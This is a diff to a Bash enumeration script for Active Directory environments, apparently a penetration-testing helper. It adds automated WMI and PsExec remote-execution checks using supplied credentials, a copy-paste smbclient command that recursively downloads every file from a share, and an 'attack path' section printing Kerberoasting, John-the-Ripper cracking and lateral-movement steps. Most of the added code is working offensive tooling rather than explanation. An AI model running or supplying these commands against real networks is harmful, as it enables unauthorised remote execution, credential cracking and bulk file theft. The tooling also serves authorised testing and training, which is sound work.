@@ -49,7 +49,6 @@ ENABLE_BH_EXPORT=false
 ENABLE_KERBROAST=false
 KERBEROS_FOUND=false
 LDAP_FOUND=false
-LDAP_BIND_TYPE=""
 LDAP_ENUM_DONE=false
 LDAP_ANON_BIND=false
 LDAP_GUEST_BIND=false
@@ -65,10 +64,13 @@ SMB_FOUND=false
 SMB_ENUM_DONE=false
 NO_COLOR=false
 KERBEROAST_FILE=""
+KERBEROAST_OUT=""
 KERB_DETECTED=false
 KERB_ENUM_DONE=false
 KERB_REALM=""
 USERS_FILE=""
+WMI_AUTH_OK=false
+PSEXEC_AUTH_OK=false
 DC_AUTH_OK=0
 LAPS_READABLE=false
 WEB_DETECTED=false
@@ -85,7 +87,6 @@ ADCS_SERVICE_DETECTED=false
 MACHINE_ACCOUNT_QUOTA=-1
 CAN_JOIN_COMPUTERS_TO_DOMAIN=false
 HAS_WRITABLE_COMPUTER_ACL=false
-MAQ_ENABLED=false
 
 # --------- Certificate Services / AD CS ----------
 HAS_CERTIPY=0
@@ -493,7 +494,7 @@ ldap_enum() {
         LDAP_TOOL="crackmapexec"
     else
         warn "netexec / crackmapexec not found — skipping LDAP enumeration"
-        tip "Install with: pipx install netexec"
+        lightbulb "Install with: pipx install netexec"
         set -e
         return
     fi
@@ -1135,6 +1136,132 @@ run_vhost_fuzz() {
     done
 }
 
+check_wmi_access() {
+    set +e  # Disable exit-on-error for this function
+    local TARGET_IP=$1
+    local DOMAIN=$2
+    local USER=$3
+    local PASS=$4
+    local l_error=false
+    
+    info "Testing WMI access on $TARGET_IP with user '$USER'"
+    
+    if ! command -v impacket-wmiexec >/dev/null 2>&1; then
+        warn "impacket-wmiexec not found — skipping WMI check"
+        return
+    fi
+
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}impacket-wmiexec $DOMAIN/$USER:'$PASS'@$TARGET_IP 'whoami'${RESET}"
+
+    # Run with timeout to prevent hangs
+    WMI_OUTPUT=$(timeout 12 impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET_IP" "whoami" 2>&1)
+    RC=$?
+    
+    # --- TIMEOUT ---
+    if [[ $RC -eq 124 ]]; then
+        warn "WMI check timed out (RPC/WMI likely filtered or hung)"
+        echo "$WMI_OUTPUT"
+        return
+    fi
+    
+    # --- STRING BINDING FAILURE ---
+    if echo "$WMI_OUTPUT" | grep -qi "Can't find a valid stringBinding"; then
+        warn "WMI service unreachable — likely RPC/WMI firewalling or no DCOM endpoints"
+        echo "$WMI_OUTPUT"
+        return
+    fi
+
+    # --- HARD AUTH FAILURES ---
+    if echo "$WMI_OUTPUT" | grep -qiE \
+        'STATUS_LOGON_FAILURE|0xc000006d|authentication failed|SMB SessionError'; then
+        warn "WMI authentication failed (invalid credentials)"
+        return
+    fi
+
+    # --- ACCESS DENIED (AUTH OK BUT NO WMI RIGHTS) ---
+    if echo "$WMI_OUTPUT" | grep -qiE \
+        'access denied|rpc_s_access_denied'; then
+        notify "WMI reachable but access denied (user lacks WMI privileges)"
+        return
+    fi
+    
+    if [[ "$l_error" != "true" ]]; then
+        # --- SUCCESS ---
+        if echo "$WMI_OUTPUT" | grep -qiE \
+            'NT AUTHORITY|\\\\'; then
+            critical "WMI access confirmed — remote execution possible"
+            WMI_AUTH_OK=true
+        fi
+
+        # --- FALLBACK ---
+        notify "WMI test inconclusive — raw output:"
+        echo "$WMI_OUTPUT"
+    fi
+}
+
+check_psexec_access() {
+    set +e  # Disable exit-on-error for this function
+    local TARGET_IP=$1
+    local DOMAIN=$2
+    local USER=$3
+    local PASS=$4
+
+    info "Testing PsExec access on $TARGET_IP with user '$USER'"
+
+    if ! command -v impacket-psexec >/dev/null 2>&1; then
+        warn "impacket-psexec not found — skipping PsExec check"
+        return
+    fi
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}impacket-psexec $DOMAIN/$USER:'$PASS'@$TARGET_IP ${RESET}"
+    
+    # Run with timeout to avoid hangs
+    PSEXEC_OUTPUT=$(timeout 12 impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET_IP" "whoami" 2>&1)
+
+    RC=$?
+    
+    if echo "$PSEXEC_OUTPUT" | grep -q "Found writable share" && echo "$PSEXEC_OUTPUT" | grep -q "Uploading file"; then
+        critical "PsExec access confirmed — service executed and file upload observed"
+        PSEXEC_AUTH_OK=true
+        set -e
+        return
+    fi
+
+    if [[ $RC -eq 124 ]]; then
+        warn "PsExec check timed out (likely firewall or unresponsive SMB)"
+        echo "$PSEXEC_OUTPUT"
+        return
+    fi
+
+    # Handle known failures
+    if echo "$PSEXEC_OUTPUT" | grep -qiE 'STATUS_LOGON_FAILURE|0xc000006d|authentication failed|SMB SessionError'; then
+        warn "PsExec authentication failed (bad creds)"
+        return
+    fi
+
+    if echo "$PSEXEC_OUTPUT" | grep -qi "STATUS_ACCESS_DENIED"; then
+        notify "PsExec reachable, but access denied — user may lack service creation rights"
+        return
+    fi
+
+    if echo "$PSEXEC_OUTPUT" | grep -qi "Unable to connect|ConnectionError|Network is unreachable"; then
+        warn "PsExec connection failed — host may be down or filtered"
+        return
+    fi
+
+    if echo "$PSEXEC_OUTPUT" | grep -qiE 'NT AUTHORITY|\\\\'; then
+        critical "PsExec access confirmed — remote execution possible"
+        PSEXEC_AUTH_OK=true
+        return
+    fi
+
+    # Fallback for unknown state
+    notify "PsExec test inconclusive — raw output:"
+    echo "$PSEXEC_OUTPUT"
+}
+
+
 # --------- Ports ----------
 PORTS=(
     "21:FTP:interesting"
@@ -1453,7 +1580,7 @@ if [ -s "$SMB_MARKER" ]; then
 
         echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "           ${GREEN}$COPY_CMD${RESET}"
-	
+	echo -e "           ${GREEN}$COPY_CMD -c 'prompt OFF; recurse ON; mget *'${RESET}"
         # Root listing first (most reliable)
         ROOT_LIST=$(timeout 6 smbclient "//$TARGET/$SHARE" -U "$AUTH" \
              -c "ls" 2>/dev/null)
@@ -1722,6 +1849,32 @@ if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
     fi
 fi
 
+# Verify Creds can Access Windows Host
+if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "135" && \
+   printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "445"; then
+
+    echo
+    info "WMI likely supported — ports 135 and 445 are open"
+
+    if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
+        check_wmi_access "$TARGET" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
+    else
+        note "No credentials provided — skipping authenticated WMI check"
+    fi
+fi
+if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "445"; then
+
+    echo
+    info "Service Control Manager Detected! - Port 445 open — testing PsExec access"
+
+    if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
+        check_psexec_access "$TARGET" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
+    else
+        note "No credentials provided — skipping authenticated PsExec check"
+    fi
+fi
+
+
 # Verify Creds can Access Domain Controller
 if  $CREDS_PROVIDED && [ $HAS_LDAP -eq 1 ]  ; then
     if dc_auth_check "$AUTH_USER" "$AUTH_PASS" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$TARGET"; then
@@ -1954,7 +2107,7 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
         fi
     else
     	warn "AD CS check skipped — certipy-ad not installed"
-        tip "Install with: pipx install certipy-ad"
+        lightbulb "Install with: pipx install certipy-ad"
     fi
 elif [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == false ]]; then
     echo
@@ -2093,7 +2246,7 @@ done
 
 # Define common paths for the functions to use
 COMMON_FUFF_PATHS=(
-      .env admin login dashboard uploads upload files backup old test dev dashboard contact
+      admin login dashboard uploads upload files backup old test dev dashboard
       console install health status docs init setup logout index menu data v1 v2 v3
       api api/v1 api/v2 config db include static assets images js css service vendor
       settings panel manage management home portal support services storage swagger setting
@@ -2223,7 +2376,7 @@ if $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 2 ] && command 
     done
 elif $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 1 ]; then
     echo
-    warn "Unable to VHOST FUZZ - 'curl' command is not available or VHOST CODE BLOCK IS STILL BROKEN"
+    warn "Unable to VHOST FUZZ - 'curl' command is not available"
     echo
 elif ! $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 1 ] && command -v curl >/dev/null; then
     echo
@@ -2326,10 +2479,12 @@ generate_synopsis() {
     fi
     
     # 2. Remote Management
-    if [ "$WINRM_DETECTED" = true ] || [ "$SSH_DETECTED" = true ]; then
+    if [ "$WINRM_DETECTED" = true ] || [ "$SSH_DETECTED" = true ] || [ "$WMI_AUTH_OK" = true ] || [ "$PSEXEC_AUTH_OK" = true ]; then
         echo -e "\n ${CYAN}REMOTE MANAGEMENT SERVICES${RESET}"
         echo -e " --------------------------------------"
         print_item "$WINRM_DETECTED" "WinRM Service is Open and Access is Allowed (Possible Lateral Movement)"
+        print_item "$WMI_AUTH_OK" "WMI is Open and Access is Allowed (Possible Lateral Movement)"
+        print_item "$PSEXEC_AUTH_OK" "PSExec Access is Allowed (Possible Lateral Movement)"
         #print_item "$SSH_DETECTED" "SSH Service is Open (Check for password/key reuse)"
     fi
 
@@ -2375,7 +2530,6 @@ generate_synopsis
 # Attack Path Decision Engine
 ########################################
 attack_path_evaluation() {
-	ATTACK_PATHS=()  #Initialize to avoid unbound variable error
     echo -e "\n${BLUE}========================================${RESET}"
     echo -e "${BYELLOW}    Attack Path Decision Engine        ${RESET}"
     echo -e "${BLUE}========================================${RESET}"
@@ -2385,8 +2539,12 @@ attack_path_evaluation() {
     if [[ -v KERBEROAST_TARGETS && ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
         ATTACK_PATHS+=("Kerberoasting")
         critical "Attack Path: Kerberoasting viable"
-        tip "Next Steps (Kerberoasting):"
-        echo "   - Request service tickets (netexec ldap ldap $TARGET -u username -p 'password' --kerberoasting output.txt / GetUserSPNs.py)"
+        lightbulb "Next Steps (Kerberoasting):"
+        echo "   - Request service tickets (netexec ldap $TARGET -u $AUTH_USER -p '$AUTH_PASS' --kerberoasting output.txt / GetUserSPNs.py)"
+        if [[ -n "$KERBEROAST_OUT" ]]; then
+            echo "   - Or run John on Kerberoast Account Output: "
+            echo "         john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_OUT"
+        fi
         echo "   - Crack hashes offline (hashcat mode 13100 / 19600)"
         echo "   - Re-test SMB / LDAP / WinRM with cracked credentials"
         echo "   - Check cracked account group membership (Domain Admins, Operators)"
